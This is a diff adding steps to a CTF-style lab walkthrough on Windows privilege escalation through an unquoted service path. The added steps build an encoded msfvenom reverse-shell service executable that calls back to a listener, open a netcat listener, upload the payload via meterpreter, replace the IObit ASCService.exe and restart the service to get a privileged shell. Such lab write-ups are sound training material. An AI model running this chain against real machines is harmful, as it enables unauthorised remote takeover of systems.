@@ -71,3 +71,34 @@ To enumerate this machine, we will use a powershell script called PowerUp, that'
 **Q6.Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?**
 - **Answer:**
 - ![emp img](scrshots/service1.png)
+**The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!**
+**Use msfvenom to generate a reverse shell as an Windows executable.**
+  ```bash
+   msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
+  ```
+  **Now start a Netcat Listener on port specified in payload**
+  ```bash
+     nc -lvnp <port>
+   ```
+ - ![emp img](scrshots/ncstart.png)
+   **Upload the payload using meterpreter**
+   ```bash
+      meterpreter > upload Advanced.exe
+     ```
+    *let us stop the  unquoted service *
+   ```bash
+      meterpreter > shell
+      sc stop <service_name>
+      exit
+   ```
+      ![emp img](scrshots/prev.png)
+   **Now lets copy our payload in the service path and start the service **
+   ```bash
+      meterpreter > cp Advanced.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
+      meterpreter > shell
+      sc start <service_name>
+   ```
+   **Look at the netcat listener we got a root shell**
+   ![emp img](scrshots/root.png)
+
+
